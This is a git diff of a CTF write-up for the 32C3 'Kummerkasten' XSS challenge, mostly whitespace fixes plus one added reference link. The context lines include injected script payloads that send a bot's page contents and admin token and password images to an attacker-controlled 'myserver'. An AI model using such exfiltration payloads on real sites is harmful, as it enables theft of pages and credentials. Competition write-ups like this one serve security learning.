@@ -6,21 +6,21 @@
 **Description:**
 
 > Our Admin is a little sad this time of the year. Maybe you can cheer him up at this site <http://136.243.194.46/>
-> 
-> 
+>
+>
 > Please note: This challenge does not follow the flag format.
-> 
-> 
+>
+>
 > Hints:
-> 
+>
 > To build the flag, concatenate both parts and omit '32C3_'
 
 
 ## Write-up
 
-Strangely, this 32c3 CTF task weighted 300 points (while *ITD* was "only" 150) however it was a ~~simple~~ straightforward XSS. You're given a page like this: ![](http://i.imgur.com/7vUobWP.png) 
+Strangely, this 32c3 CTF task weighted 300 points (while *ITD* was "only" 150) however it was a ~~simple~~ straightforward XSS. You're given a page like this: ![](http://i.imgur.com/7vUobWP.png)
 
-*Your team* is nearly arbitrary (just a basic filter) and the injectable field is the message itself. It is possible to inject `<script src="yourstuff.js"></script>` right away. Clearly, there's a bot reading all the messages so the first thing right off the bat I did was to hook in [BeEF](http://beefproject.com/). The bot appeared in the logs shortly and then disconnected. I wasn't really disappointed as the original page already contained jQuery code so coding payloads would be a cakewalk. 
+*Your team* is nearly arbitrary (just a basic filter) and the injectable field is the message itself. It is possible to inject `<script src="yourstuff.js"></script>` right away. Clearly, there's a bot reading all the messages so the first thing right off the bat I did was to hook in [BeEF](http://beefproject.com/). The bot appeared in the logs shortly and then disconnected. I wasn't really disappointed as the original page already contained jQuery code so coding payloads would be a cakewalk.
 
 First I dumped the current page the bot was seeing:
 
@@ -28,7 +28,7 @@ First I dumped the current page the bot was seeing:
 $.post('http://myserver', {'a': btoa($('body')[0].innerHTML)})
 ```
 
-The bot returned this: 
+The bot returned this:
 
 ```html
 <script src="js/jquery-2.1.4.min.js"></script>
@@ -138,10 +138,10 @@ The bot returned this:
         Is this really our production MySQL password? And is this by any chance
         the exact same password you're using everywhere else?  <br/>
 		<b>Are you fucking kidding me?</b><br/>
-        Please tell me that this is not also your password for the admin section...<br/> 
+        Please tell me that this is not also your password for the admin section...<br/>
         The only thing that luckily prevents anyone from exploiting this is
         that we enforce Two Factor Authentication. Even an imbecile
-        like you can't fuck this up since it's only stored on your phone...<br/> 
+        like you can't fuck this up since it's only stored on your phone...<br/>
         Sorry admin, but this is unacceptable. I've deleted the checkin from
         the repo and I don't think anyone saw the commit...</p>
         <footer>Zero Cool on 2015-12-28</footer>
@@ -239,7 +239,7 @@ This is a clue that perhaps we need to take a look at the (potential) snapshot w
 </html>
 ```
 
-So we have two images of interest: 
+So we have two images of interest:
 
 `<img src="admin/img/token.png?20151228" id="img-token"/>` and `<img src="admin/img/root_pw.png?20151228" id="img-bug-0003"/>`. So I proceed with this code:
 
@@ -251,7 +251,7 @@ request.responseType    = "arraybuffer";
 request.send(null);
 
 setTimeout(function(){
-	
+
 	var blob = new Blob([request.response], {type: "image/png"});
 	var oReq = new XMLHttpRequest();
 	oReq.open("POST", "http://myserver", true);
@@ -291,7 +291,7 @@ Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept
 Access-Control-Allow-Methods: GET, POST, PUT
 ```
 
-One is for the `OPTIONS` request and another is the answer itself. 
+One is for the `OPTIONS` request and another is the answer itself.
 
 The bot was apparently down for a while but then I saw a callback in the terminal in the middle of the night with the good news - both images arrived. As the request was raw and I did not base64 it I just ran `binwalk` on it and extracted the PNGs:
 
@@ -307,3 +307,4 @@ As the task was saying that the format of the flag is not of the standard form I
 
 * <https://github.com/andihit/ctf-write-ups/blob/master/2015/32c3/kummerkasten.md>
 * <http://breaking.into.systems/2015/12/29/32c3ctf-kummerkasten-writeup/>
+* <http://nandynarwhals.org/2015/12/31/32c3ctf-kummerkasten-web-300/>
